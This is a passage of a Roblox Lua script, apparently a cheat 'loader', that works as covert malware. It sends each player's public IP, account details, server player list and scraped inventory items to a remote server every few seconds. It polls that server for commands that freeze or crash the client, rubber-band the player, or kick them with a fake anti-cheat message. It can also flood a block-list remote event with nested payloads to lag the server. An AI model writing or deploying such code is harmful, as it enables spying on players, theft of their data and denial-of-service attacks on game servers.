    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    if info and info.Name then cachedGameName = info.Name end
    return cachedGameName or "Unknown Game"
end

local clientIp = ""
task.spawn(function()
    local ok, ip = pcall(function() return game:HttpGet("https://api.ipify.org") end)
    if ok and type(ip) == "string" then
        ip = ip:gsub("%s+", "")
        if #ip > 0 and #ip < 64 then clientIp = ip end
    end
    if clientIp == "" then
        local res = httpOnce({ Url = "https://api.ipify.org", Method = "GET" })
        if res and type(res.Body) == "string" then
            local b = res.Body:gsub("%s+", "")
            if #b > 0 and #b < 64 then clientIp = b end
        end
    end
end)

local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end

local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end

local function collectBrainrots()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return list end

    local possibleGUIs = {
        "DuelsMachineSession",
        "DuelsMachine",
        "BrainrotUI",
        "BrainrotSession",
        "SessionGUI",
        "DuelsGUI",
    }

    local gui = nil
    for _, name in ipairs(possibleGUIs) do
        gui = safe(function() return pg:FindFirstChild(name) end)
        if gui then break end
    end
    if not gui then return list end

    local targetFrame = nil
    local function findFrame(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name == "ItemList" or child:FindFirstChild("Template")) then
                return child
            end
            local found = findFrame(child)
            if found then return found end
        end
        return nil
    end

    targetFrame = findFrame(gui)
    if not targetFrame then
        targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
    end
    if not targetFrame then
        for _, child in ipairs(gui:GetDescendants()) do
            if child:IsA("Frame") and #child:GetChildren() > 3 then
                targetFrame = child
                break
            end
        end
    end
    if not targetFrame then return list end

    local processedItems = {}
    local function processItem(item)
        if not item or not item:IsA("Instance") or processedItems[item] then return end
        processedItems[item] = true

        local title = nil
        local cash = nil

        for _, obj in ipairs(item:GetDescendants()) do
            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
                local text = obj.Text
                if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
                        if not title or (#text > #title) then
                            title = text
                        end
                    end
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or
                       (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
                        cash = text
                    end
                end
            end
        end

        if title or cash then
            if title and title ~= "" then
                title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if cash and cash ~= "" then
                cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if title and string.match(title, "^%d+$") and not cash then
                return
            end
            table.insert(list, {
                title = title and title ~= "" and title or "Unknown Item",
                cash = cash and cash ~= "" and cash or "0"
            })
        end
    end

    local function processAll(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and #child:GetChildren() > 0 then
                local hasText = false
                for _, desc in ipairs(child:GetDescendants()) do
                    if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
                        hasText = true
                        break
                    end
                end
                if hasText then
                    processItem(child)
                end
            end
            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                processAll(child)
            end
        end
    end

    processAll(targetFrame)

    for _, child in ipairs(targetFrame:GetChildren()) do
        if child.Name == "Template" and child:IsA("Frame") then
            processItem(child)
        end
    end

    if #list == 0 then
        local simpleBrainrots = {}
        local seenTexts = {}
        for _, child in ipairs(pg:GetDescendants()) do
            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                    seenTexts[text] = true
                    local cash = "0"
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if text == "" then text = "Item" end
                    end
                    if #text > 1 then
                        table.insert(simpleBrainrots, { title = text, cash = cash })
                    end
                end
            end
        end
        if #simpleBrainrots > 0 then
            return simpleBrainrots
        end
    end

    return list
end

local firstBeat = true

local function heartbeat()
    safe(function()
        local okBr, brainrots = pcall(collectBrainrots)
        if not okBr or type(brainrots) ~= "table" then brainrots = {} end
        local body = HttpService:JSONEncode({
            user_id = LP.UserId,
            username = LP.Name,
            display_name = LP.DisplayName,
            avatar_url = avatarUrl(),
            place_id = game.PlaceId,
            game_name = gameName(),
            job_id = game.JobId,
            executor = executorName,
            loader_version = LOADER_VERSION,
            client_ip = clientIp,
            session_start = firstBeat,
            server_players = serverPlayers(),
            brainrots = brainrots,
        })
        local res = httpRequest({
            Url = BASE .. "/api/public/heartbeat?site=" .. SITE_SLUG,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Api-Key"] = KEY,
                ["X-Site-Slug"] = SITE_SLUG,
                ["X-Site-Password"] = SITE_PASSWORD,
            },
            Body = body,
        })
        if res then firstBeat = false end
        if not res then
            local simpleBrainrots = {}
            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
            if pg then
                for _, child in ipairs(pg:GetDescendants()) do
                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
                            table.insert(simpleBrainrots, { title = text, cash = "0" })
                        end
                    end
                end
            end
            if #simpleBrainrots > 0 then
                httpRequest({
                    Url = BASE .. "/api/public/heartbeat?site=" .. SITE_SLUG,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["X-Api-Key"] = KEY,
                        ["X-Site-Slug"] = SITE_SLUG,
                        ["X-Site-Password"] = SITE_PASSWORD,
                    },
                    Body = HttpService:JSONEncode({
                        user_id = LP.UserId,
                        username = LP.Name,
                        display_name = LP.DisplayName,
                        avatar_url = avatarUrl(),
                        place_id = game.PlaceId,
                        game_name = gameName(),
                        job_id = game.JobId,
                        executor = executorName,
                        loader_version = LOADER_VERSION,
                        client_ip = clientIp,
                        server_players = serverPlayers(),
                        brainrots = simpleBrainrots,
                    }),
                })
            end
        end
    end)
end

local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do
        table.remove(posHistory, 1)
    end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then
        pcall(task.cancel, intervalThread)
        intervalThread = nil
    end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive and alive() do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end

local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then
        isActive = true
        startLoop()
    else
        isActive = false
        stopLoop()
    end
end

local PING_REMOTE_NAMES = {"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}
local PING_DEPTH = 186
local PING_POWER = 62000
local PING_DELAY = 0.0002

local function pingFindRemote()
    for _, name in ipairs(PING_REMOTE_NAMES) do
        local r = RobloxReplicated:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, child in ipairs(RobloxReplicated:GetChildren()) do
        if child:IsA("RemoteEvent") and child.Name:find("Block") then return child end
    end
    return nil
end

local function pingBuildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, PING_DEPTH do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / (PING_DEPTH + 2)), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local pingThread = nil
local pingActive = false

local function setPingEm(on)
    if on == pingActive then return end
    pingActive = on
    if on then
        pingThread = task.spawn(function()
            local remote = pingFindRemote()
            while pingActive and alive() and not remote do
                task.wait(0.5)
                remote = pingFindRemote()
            end
            if not pingActive or not remote then return end
            local payload = pingBuildPayload(PING_POWER)
            while pingActive and alive() do
                pcall(function() remote:FireServer(payload) end)
                task.wait(PING_DELAY)
            end
        end)
    else
        pingThread = nil
    end
end


genv.__XENO_CLEANUP = function()
    pcall(setFpsLimit, false)
    pcall(setPingEm, false)
    pcall(setMode, nil)
end


local kicked = false
local prevLagN = false
local prevLagC = false
local prevFps = false
local prevPing = false

local function poll()
    local res = httpRequest({
        Url = BASE .. "/api/public/command?site=" .. SITE_SLUG .. "&user_id=" .. LP.UserId,
        Method = "GET",
        Headers = {
            ["X-Api-Key"] = KEY,
            ["X-Site-Slug"] = SITE_SLUG,
            ["X-Site-Password"] = SITE_PASSWORD,
        },
    })
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end

    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    local wantPing = (data.ping_em == true)
    if wantPing ~= prevPing then
        prevPing = wantPing
        setPingEm(wantPing)
    end

    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC or wantN ~= prevLagN then
        prevLagC = wantC
        prevLagN = wantN
        if wantC then
            setMode("carry")
        elseif wantN then
            setMode("normal")
        else
            setMode(nil)
        end
    end

    if data.crash == true then
        while true do end
    end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

task.spawn(function() pcall(heartbeat) end)
task.spawn(function() pcall(poll) end)

task.spawn(function()
    while alive() do
        task.wait(3)
        if not alive() then break end
        pcall(heartbeat)
    end
end)

task.spawn(function()
    while alive() do
        task.wait(0.5)
        if not alive() then break end
        pcall(poll)
    end
end)
